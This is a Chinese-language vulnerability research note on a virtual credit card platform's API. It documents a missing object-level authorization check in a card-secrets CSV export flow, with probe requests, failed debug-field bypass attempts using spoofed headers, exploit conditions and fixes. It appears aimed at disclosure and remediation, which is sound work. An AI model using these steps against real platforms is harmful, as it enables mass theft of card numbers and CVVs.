# 阶梯验证导出网关 · 对象授权缺失（2026-10-21 实测）

目标：白标 VCC 平台客户 API（`https://<host>/api/v1`）。会话认证 = cookie `session_token` + `csrf_token`，请求头带 `X-CSRF-Token`。

## 端点链（从前端 bundle 扒出）

```
POST /exports/card-secrets/authorize
  body: {card_ids: ["<id-string>", ...], verification_method: "EMAIL"|"TOTP", verification_code: "\d{6}"}
  resp: {authorization_token: "..."}

POST /exports/card-secrets.csv
  body: {authorization_token: "..."}
  resp: CSV 文件（完整卡号 + 有效期 + CVV）

POST /exports/card-secrets/email-verification/send
  resp: {message: "卡片导出验证码已发送", expires_in: 600, debug_code: null}
```

关键：authorize 与 csv 是**两步**；csv 只吃 `authorization_token`，不吃 ID 列表。

## 决定性证据

该租户卡片列表为空（`GET /cards` → `{"items":[]}`），用**任意字符串 ID** 打 authorize：

```
POST /exports/card-secrets/authorize
{"card_ids":["18906"],"verification_method":"EMAIL","verification_code":"000000"}
-> 400 {"error":{"code":"EMAIL_CODE_INVALID","message":"邮箱验证码无效或已过期，请重新发送"}}
```

**不是 `CARD_NOT_FOUND` / `FORBIDDEN`** —— 说明 authorize 只验邮箱码，不验 ID 归属。

对照臂（同一批外来 ID 在另一个端点）：

```
GET /cards/18906/verification-code -> 404 {"code":"CARD_NOT_FOUND"}
GET /cards/999999/verification-code -> 404 {"code":"CARD_NOT_FOUND"}
```

结论：`/cards/{id}/verification-code` 查归属；`/exports/card-secrets/authorize` 不查。

## 类型与 schema 细节

- `card_ids` 必须是**字符串数组**；传 int → `422 string_type`。
- `verification_code` 必须 6 位数字；`verification_method` 支持 `EMAIL` / `TOTP`。
- 前端在 `verification_method === 'TOTP'` 时把标签切成「身份验证器验证码」，否则「邮箱验证码」。

## debug_code 探测（全部失败）

发码响应固定带 `debug_code` 字段，生产恒为 `null`。实测以下都不填充：

- `X-Forwarded-For: 127.0.0.1`
- `X-Real-IP: 127.0.0.1`
- `X-Debug: 1`
- body `{"debug": true}`
- `?debug=1`

发码限速：第 1 发 200；连续第 3 发起 `429 RATE_LIMITED`，`retry_after_seconds` ≈ 584（10 分钟窗口）。

## 利用条件与修复

- 利用条件：拿到**本账号**的合法邮箱码（码发到账号绑定邮箱）→ authorize 签发 token → csv 导出**任意 ID** 的明文卡信息。
- 修复：authorize 必须逐个校验 `card_ids` 属于当前租户；token 应绑定已校验的 ID 集合（HMAC/JWT 载荷含 ids）；csv 生成时再次按租户过滤。
- 报告口径：不是「认证绕过」，是「阶梯验证端点缺失对象级授权（BOLA）+ 合法第二因子下的越权批量导出」。
